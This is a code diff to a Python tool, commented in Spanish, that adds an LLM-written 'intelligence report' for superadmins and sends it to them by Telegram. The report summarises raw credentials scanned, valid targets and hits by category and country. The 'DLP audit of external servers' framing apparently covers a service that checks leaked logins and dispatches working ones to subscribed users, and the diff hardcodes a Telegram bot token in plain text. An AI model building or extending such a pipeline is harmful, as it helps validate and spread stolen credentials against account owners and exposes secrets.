@@ -138,6 +138,44 @@ Volcado de texto:
         print(f"❌ Error en Gemini AI Parser: {e}")
         return []
 
+def generate_exec_summary(total_scanned, total_valid, hits_buffer):
+    if not Groq or not GROQ_API_KEY:
+        return "⚠️ Sin clave de Groq configurada para reporte AI."
+        
+    categories = {}
+    countries = {}
+    for h in hits_buffer:
+        cat = h['match']
+        cntry = h['country']
+        categories[cat] = categories.get(cat, 0) + 1
+        countries[cntry] = countries.get(cntry, 0) + 1
+        
+    stats = f"Archivos Procesados: 1\nCredenciales Crudas: {total_scanned}\nObjetivos Válidos: {total_valid}\nHITS Totales: {len(hits_buffer)}\nPor Categoría: {categories}\nPor País: {countries}"
+    
+    prompt = f"""
+Eres el "Director Oficial de Inteligencia (CISO)" de una operación de ciberseguridad.
+Acabamos de terminar una auditoría DLP profunda en servidores externos.
+A continuación tienes los datos crudos de la sesión.
+Redacta un reporte Ejecutivo MUY CORTO (máximo 4 párrafos cortos), dirigido al "Comandante".
+Tono: Militar, profesional, conciso y de alto secreto.
+Ignora tecnicismos irrelevantes, céntrate en los números clave, las principales categorías encontradas y de qué países vienen los mayores aciertos. No uses markdown intrincado pero puedes resaltar cosas con asteriscos.
+Finaliza recomendando un siguiente paso breve.
+
+DATOS CRUDOS DE LA SESIÓN:
+{stats}
+"""
+    try:
+        groq_client = Groq(api_key=GROQ_API_KEY)
+        chat_completion = groq_client.chat.completions.create(
+            messages=[{"role": "user", "content": prompt}],
+            model="llama3-8b-8192",
+            temperature=0.3,
+            max_tokens=600
+        )
+        return chat_completion.choices[0].message.content.strip()
+    except Exception as e:
+        return f"Error generando reporte IA: {e}"
+
 # =======================================================
 # MOTOR DE AUDITORÍA DLP LOCAL (VPS Windows)
 # =======================================================
@@ -356,18 +394,35 @@ def process_file_and_scan(file_path):
         try:
             conn = get_remote_db_conn()
             cur = conn.cursor()
-            cur.execute("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
+            cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
             active_users = cur.fetchall()
             conn.close()
             
+            super_admins = []
             for row in active_users:
                 cid = row[0]
+                is_admin = row[1] if len(row) > 1 and row[1] is not None else 0
+                if is_admin == 1: 
+                    super_admins.append(cid)
+                    
                 for original_hit in hits_buffer:
                     user_hit_copy = original_hit.copy()
                     user_hit_copy["chat_id"] = cid
                     final_hits_to_dispatch.append(user_hit_copy)
                     
             send_consolidated_report(final_hits_to_dispatch)
+            
+            if super_admins:
+                print("🧠 Generando Reporte de Salud (Llama-3) para Súper Administrador...")
+                summary_text = generate_exec_summary(len(raw_pairs), len(valid_creds), hits_buffer)
+                token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+                for s_cid in super_admins:
+                    try:
+                        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
+                            json={"chat_id": s_cid, "text": f"🧠 *REPORTE DE INTELIGENCIA (GROQ AI)*\n\n{summary_text}", "parse_mode": "Markdown"})
+                    except Exception as e: 
+                        print(f"Error enviando reporte AI: {e}")
+                        
         except Exception as e:
             print(f"❌ Error despachando Hits a usuarios: {e}")
     else:
